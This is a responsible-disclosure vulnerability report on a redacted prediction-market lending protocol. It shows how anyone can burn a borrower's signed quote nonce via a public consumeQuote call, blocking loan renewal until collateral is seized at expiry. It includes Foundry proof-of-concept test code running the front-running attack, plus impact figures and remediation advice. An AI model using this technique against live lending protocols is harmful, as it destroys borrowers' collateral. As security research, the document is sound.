# Based on deployed contracts

Project: PM-01 — name-redacted prediction-market lending protocol
Category: Prediction-market collateral lending, leveraged outcome positions and asynchronous lending vault
Severity: Medium–High when chained with the expiry clock — qualified source severity
Engagement: Independent hunting + responsible disclosure
Chain: Polygon Amoy testnet, chain ID 80002; source/fork snapshot block 51,383,934 (28 October 2026)
Tech stack: Solidity 0.8.26 / EVM, OpenZeppelin, ERC20, ERC1155, ERC4626 and ERC7540-style asynchronous redemption; Foundry / local Anvil fork tooling
Evidence: Historical local-fork test source and reported results; synthetic setup described below
Remediation: No confirmed remediation is established.
Contribution: Independent security research; program acceptance is not asserted.
Proof availability: Excerpts and source references; the original harness is not distributed.

# Public quote consumption can block renewal until collateral forfeiture

## Description

Any caller can consume a valid signed quote and mark its nonce used. The signature binds the borrower but the standalone oracle function does not bind the consuming caller. An observer can therefore burn a visible roll quote before the borrower uses it. A failed transaction alone is griefing; the stronger documented chain keeps a borrower from renewing near epochEnd until permissionless expiry seizes its collateral.

The chain requires visible valid replacement quotes, successful ordering before the borrower, a borrower dependent on renewal and no timely repayment/private-ordering rescue. The proof performs two ordered burns; it does not establish winning every real mempool race or indefinite service denial.

The deployment association is with the recorded Polygon Amoy testnet snapshot. Provider-runtime comparison does not establish independent recompilation, equivalence to an earlier audit revision, or a mainnet incident.

### Mechanism step by step

#### Step 1 — Consume a victim quote without caller authorization

Source: `src/PremiumOracle.sol:55-79`

```solidity
    /// @inheritdoc IPremiumOracle
    function consumeQuote(PremiumQuote calldata q, bytes calldata sig) external {
        if (block.timestamp > q.deadline) revert Errors.QuoteExpired(q.deadline);
        if (isNonceUsed[q.nonce]) revert Errors.NonceAlreadyUsed(q.nonce);

        bytes32 digest = _hashTypedDataV4(
            keccak256(
                abi.encode(
                    QUOTE_TYPEHASH,
                    q.borrower,
                    q.tokenId,
                    q.principal,
                    q.collateralQty,
                    q.epoch,
                    q.premiumBps,
                    q.nonce,
                    q.deadline
                )
            )
        );
        address recovered = ECDSA.recover(digest, sig);
        if (recovered != signer) revert Errors.SignerInvalid(recovered);

        isNonceUsed[q.nonce] = true;
        emit Events.NonceUsed(q.nonce);
```

The external method checks deadline, nonce and signer, then marks the nonce used. It never requires the borrower or an authorized protocol consumer to be msg.sender. Knowledge of an authentic signature is enough; forging one is unnecessary.

#### Step 2 — Reject the legitimate borrower roll

Source: `src/BorrowerLogic.sol:132-144`

```solidity
        uint256 liability = vault.queueLiability();
        uint256 idle = ledger.idle();
        if (liability > idle) revert Errors.RollBlockedByQueue(liability, idle);

        premiumOracle.consumeQuote(q, qSig);
        _verifyMark(m, mSig);

        // Fresh underwriting means fresh sizing (I11): the same 4.4 computation as borrow, against
        // a mark verified in this transaction. The principal is pinned, so the check is an upper
        // bound — collateral that has drifted below the debt cannot be rolled at stale terms, only
        // repaid down to today's sizing and then rolled. Over-collateralized rolls pass unchanged.
        uint256 sized = _sizedPrincipal(l.tokenId, l.qty, m.mark);
        if (l.principal > sized) revert Errors.RollExceedsSizing(sized, l.principal);
```

After ownership and other gates, the borrower reaches consumeQuote and hits NonceAlreadyUsed. A new quote can recover only if it is not consumed first. The analogous leverage-quote method is also public (`src/PremiumOracle.sol:83-106`), but the economic expiry chain here concerns direct loans.

#### Step 3 — Let the loan clock expire

Source: `src/Liquidator.sol:244-251`

```solidity
    function _claim(uint256 loanId) internal {
        ILedger.Loan memory l = ledger.loan(loanId);
        if (l.status != LoanStatus.Active) revert Errors.LoanNotActive(loanId);
        if (uint64(block.timestamp) < l.epochEnd) revert Errors.NotYetExpired(loanId, l.epochEnd);

        emit Events.ExpiryClaimed(loanId, msg.sender);
        _settleShortfall(loanId, l.principal, true);
    }
```

The proof burns two rolls in the final 120 seconds and advances beyond expiry. claimExpired is public (`src/Liquidator.sol:104-107`) and ignores attempted-but-failed renewals. The shared settlement tail seizes collateral (`src/Liquidator.sol:260-274`).

#### Step 4 — Route later proceeds through the forfeiture waterfall

Source: `src/Liquidator.sol:153-163`

```solidity
        uint256 outstanding = _buffer.outstandingAdvance(loanId);
        uint256 bufferRepaid = amount < outstanding ? amount : outstanding;
        uint256 afterAdvance = amount - bufferRepaid;
        uint256 restoredSoFar = poolRestored[loanId];
        uint256 unrestored = ledger.poolLoss(loanId) - restoredSoFar;
        uint256 restored = afterAdvance < unrestored ? afterAdvance : unrestored;
        uint256 treasuryCut = MathLib.bpsDown(afterAdvance - restored, surplusSplitBps);
        uint256 poolShare = afterAdvance - treasuryCut;

        if (restored != 0) poolRestored[loanId] = restoredSoFar + restored;
        emit Events.ProceedsRemitted(loanId, amount, bufferRepaid, treasuryCut, poolShare);
```

After Buffer repayment and pool-loss restoration, remaining surplus goes to treasury/pool, not the borrower. The griefer need not receive it. Economic harm relies on this consequence of missing the renewal deadline.

### Impact and proof limits

The receipt reports two burns, two failed rolls and an expired loan with no borrower collateral remaining. The impact model records borrower net -6,060.328768 pUSD, treasury +1,200 and pool recovery +10,793.967122. Those proceeds assume disposal at 0.60 and privileged remittance, not attacker receipt. The attacker's modeled cost is gas, with no key or capital role in nonce consumption.

Quote reissue, private delivery/order protection or repayment can break the chain. The original test uses generic expectRevert rather than matching the nonce error; source confirms the used-nonce gate. No production quote-server behavior, real transaction-ordering success or actual loss is established.

### Remediation direction

Restrict destructive nonce consumption to authorized protocol consumers and bind it atomically to the intended action. If direct user consumption is required, authenticate that consuming authority. Test third-party presentation of a valid victim quote followed by successful legitimate execution.

No confirmed fix is established by the available evidence.

## Proof of concept

Recorded tests: `test_poc3_quoteBurnForcedExpiry`, `poc/src/[project]ForkPoCs.sol:274-308`; impact refinement `test_t4_quoteBurnForcedExpiryImpact`, `poc/src/FinalProofs.t.sol:196-232`. md:14,36`; The harness installs controlled signers through timelock impersonation and mints the loan collateral/lender book. Valid quote issuance is supplied by setup; the attacker only consumes existing signed inputs. Economic settlement is simulated by a privileged remitter.

## Relevant test excerpts

Controlled signers and funding:

Source: `poc/src/[project]ForkPoCs.sol:148-165`

```solidity
        markSigner = vm.addr(markKey);
        quoteSigner = vm.addr(quoteKey);
        // Test scaffolding: install test signers behind the timelock address.
        vm.startPrank(TL);
        pool.setMarkSigner(markSigner);
        liq.setMarkSigner(markSigner);
        oracle.setSigner(quoteSigner);
        vm.stopPrank();
        // Lender funds the book.
        pusd.mint(lender, 100_000e6);
        vm.startPrank(lender);
        pusd.approve(VAULT, type(uint256).max);
        vault.deposit(100_000e6, lender);
        vm.stopPrank();
        // Borrower holds collateral.
        ctf.mint(borrower, TOKEN_ID, QTY);
        vm.prank(borrower);
        ctf.setApprovalForAll(POOL, true);
```

Loan setup and two attacker-first nonce consumptions:

Source: `poc/src/[project]ForkPoCs.sol:275-297`

```solidity
        uint64 t0 = uint64(block.timestamp);
        PremiumQuote memory q1 = _quote(borrower, 6_000e6, 1 days, 1, t0 + 300);
        MarkAttestation memory m0 = MarkAttestation(TOKEN_ID, MARK_060, t0);
        bytes memory q1Sig = _signQuote(q1);
        bytes memory m0Sig = _signMark(pool.MARK_DOMAIN_SEPARATOR(), m0);
        vm.prank(borrower);
        uint256 loanId = pool.borrow(BorrowParams(TOKEN_ID, QTY, borrower), q1, q1Sig, m0, m0Sig);

        // Race to expiry: borrower needs a roll. Every roll quote they publish
        // (mempool calldata) can be consumed by anyone before their tx lands.
        uint64 nearEnd = uint64(block.timestamp) + 1 days - 120;
        vm.warp(nearEnd);
        for (uint256 n = 2; n <= 3; n++) {
            PremiumQuote memory rq = _quote(borrower, 6_000e6, 1 days, n, nearEnd + 300);
            bytes memory rsig = _signQuote(rq);
            vm.prank(attacker); // griefer: no role, no funds beyond gas
            oracle.consumeQuote(rq, rsig); // succeeds: permissionless by design
            MarkAttestation memory rm = MarkAttestation(TOKEN_ID, MARK_060, uint64(block.timestamp));
            bytes memory rmSig = _signMark(pool.MARK_DOMAIN_SEPARATOR(), rm);
            vm.expectRevert(); // NonceAlreadyUsed
            vm.prank(borrower);
            pool.rollLoan(loanId, rq, rsig, rm, rmSig);
        }
```

Expiry action and assertions:

Source: `poc/src/[project]ForkPoCs.sol:300-308`

```solidity
        vm.warp(nearEnd + 200);
        uint256 walletBefore = ctf.balanceOf(LIQ_WALLET, TOKEN_ID);
        vm.prank(attacker);
        liq.claimExpired(loanId);
        Loan memory l = ledger.loan(loanId);
        assertTrue(l.status == LoanStatus.Expired, "forced expiry after sustained quote burns");
        assertEq(ctf.balanceOf(LIQ_WALLET, TOKEN_ID) - walletBefore, QTY, "collateral seized to liquidation wallet");
        assertEq(ctf.balanceOf(borrower, TOKEN_ID), 0, "borrower equity destroyed");
        emit Receipt("V4_CHAIN_RESULT={burns:2, victimRollReverts:2, finalStatus:Expired, borrowerCtfRecovered:0, attackerCost:gasOnly}");
```

Recorded receipts:

Source: `poc/README.md:31-31`

```text
V4_CHAIN_RESULT={burns:2, victimRollReverts:2, finalStatus:Expired, borrowerCtfRecovered:0, attackerCost:gasOnly}
```

Source: `poc/README.md:51-51`

```text
V4_IMPACT_RESULT={victimNet:-6060328768, treasuryGain:1200000000, poolRecovery:10793967122, attackerSpend:gasOnly}
```
